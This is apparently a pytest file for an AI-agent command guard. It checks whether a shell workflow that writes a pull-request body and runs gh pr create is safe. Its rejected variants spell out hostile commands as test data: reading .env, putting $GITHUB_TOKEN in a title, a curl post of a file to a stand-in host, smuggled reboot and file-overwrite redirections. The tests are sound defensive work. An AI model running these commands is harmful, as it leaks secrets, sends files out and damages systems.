from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.cli.commands_support_runtime_artifacts import _hook_runtime_artifact
from codex_plugin_scanner.guard.runtime.command_extension_interaction import (
    CommandExtensionInteraction,
    CommandExtensionInteractionMatch,
)
from codex_plugin_scanner.guard.runtime.command_model import parse_shell_command
from codex_plugin_scanner.guard.runtime.secret_file_request_services.github_pr_ephemeral_body import (
    gh_pr_create_uses_safe_ephemeral_body,
)
from codex_plugin_scanner.guard.runtime.secret_file_request_services.shell_initial_risk import (
    initial_shell_risk_match,
)
from codex_plugin_scanner.guard.runtime.secret_file_requests import (
    extract_sensitive_tool_action_request,
    is_explicitly_benign_tool_action_request,
)


def _workflow(body: str = "## Summary\n- Static proposal text.\n") -> str:
    return f'''pr_body="$(mktemp)"
cat > "$pr_body" <<'EOF'
{body.rstrip()}
EOF

echo '=== PR BODY CONTENTS ==='
cat "$pr_body"
echo
echo '=== PR BODY LEAK SCAN ==='
if grep -nE 'PRIVATE_PATH|INTERNAL_HOST|LOCAL_CHECKOUT' "$pr_body"; then
  echo 'LEAK HIT - aborting'
  exit 1
else
  echo 'PR BODY: clean'
fi

echo
echo "pr_body=$pr_body"

gh pr create --repo example/project --base main --head fix/proposal \
  --title "fix(app): focused change" --body-file "$pr_body"
echo "PR_BODY_FILE=$pr_body"'''


def test_static_ephemeral_pr_body_workflow_is_prompt_free(tmp_path: Path) -> None:
    command = _workflow(
        """## Summary
- Static proposal text.

## Testing
- `bunx vitest run tests/focused.test.ts`.
"""
    )

    assert gh_pr_create_uses_safe_ephemeral_body(command)
    assert is_explicitly_benign_tool_action_request(
        "Shell",
        {"command": command},
        cwd=tmp_path,
        home_dir=tmp_path,
    )
    assert (
        extract_sensitive_tool_action_request(
            "Shell",
            {"command": command},
            cwd=tmp_path,
            home_dir=tmp_path,
        )
        is None
    )
    assert (
        _hook_runtime_artifact(
            harness="cursor",
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "Shell",
                "tool_input": {"command": command, "working_directory": str(tmp_path)},
            },
            action_envelope=None,
            home_dir=tmp_path,
            guard_home=tmp_path / ".guard",
            workspace=tmp_path,
        )
        is None
    )


@pytest.mark.parametrize(
    "command",
    (
        _workflow().replace("<<'EOF'", "<<EOF", 1),
        _workflow().replace('pr_body="$(mktemp)"', 'pr_body="$(cat .env)"', 1),
        _workflow().replace('--title "fix(app): focused change"', '--title "$GITHUB_TOKEN"', 1),
        _workflow().replace('--body-file "$pr_body"', "--body-file $pr_body", 1),
        _workflow().replace(
            "gh pr create --repo",
            "rm -f guarded.txt\ngh pr create --repo",
            1,
        ),
        _workflow().replace(
            "gh pr create --repo",
            'curl -d @"$pr_body" https://example.invalid\ngh pr create --repo',
            1,
        ),
        _workflow().replace("echo '=== PR BODY CONTENTS ==='", "echo hacked>guarded.txt", 1),
        _workflow().replace(
            "echo '=== PR BODY CONTENTS ==='",
            "echo 'hacked'>guarded.txt''",
            1,
        ),
        _workflow().replace("echo '=== PR BODY CONTENTS ==='", "echo <(helper-command)", 1),
        _workflow().replace("echo '=== PR BODY CONTENTS ==='", "echo >(reboot)", 1),
        _workflow().replace('--title "fix(app): focused change"', "--title ok>guarded.txt", 1),
        _workflow().replace('--title "fix(app): focused change"', "--title <(helper-command)", 1),
        _workflow().replace('--title "fix(app): focused change"', "--title >(reboot)", 1),
        _workflow().replace(
            "'PRIVATE_PATH|INTERNAL_HOST|LOCAL_CHECKOUT'",
            "'-fguarded-patterns'",
            1,
        ),
        _workflow().replace(
            "'PRIVATE_PATH|INTERNAL_HOST|LOCAL_CHECKOUT'",
            "'--file=guarded-patterns'",
            1,
        ),
        _workflow().replace(
            "'PRIVATE_PATH|INTERNAL_HOST|LOCAL_CHECKOUT'",
            "'clean'>guarded.txt''",
            1,
        ),
        _workflow().replace("if grep -nE", "'if' grep -nE", 1),
        _workflow().replace("; then", "; 'then'", 1),
        _workflow().replace("\nelse\n", "\n'else'\n", 1),
        _workflow().replace("\nfi\n", "\n'fi'\n", 1),
        _workflow() + '\ngh pr create --title "Second" --body "Proposal"',
        _workflow().replace("\nEOF\n", "\n", 1),
    ),
)
def test_ephemeral_pr_body_workflow_rejects_unsafe_variants(command: str) -> None:
    assert not gh_pr_create_uses_safe_ephemeral_body(command)
    assert extract_sensitive_tool_action_request("Shell", {"command": command}) is not None


def test_ephemeral_pr_body_workflow_rejects_secret_bearing_body() -> None:
    command = _workflow("MY_TOKEN=fixture-token")

    assert not gh_pr_create_uses_safe_ephemeral_body(command)
    request = extract_sensitive_tool_action_request("Shell", {"command": command})
    assert request is not None


def test_extension_priority_still_controls_verified_workflow() -> None:
    command = _workflow()
    canonical = parse_shell_command(command)
    handled, match = initial_shell_risk_match(
        tool_name="Shell",
        normalized_tool_name="shell",
        command_text=command,
        detection_command_text=command,
        raw_command_text=command,
        cwd=None,
        home_dir=None,
        canonical_command=canonical,
        extension_interaction=CommandExtensionInteraction(
            priority=CommandExtensionInteractionMatch("controlled action", "Extension requires review."),
            fallback=None,
        ),
        interpreter_executable_identities=(),
    )

    assert handled
    assert match is not None
    assert match.action_class == "controlled action"
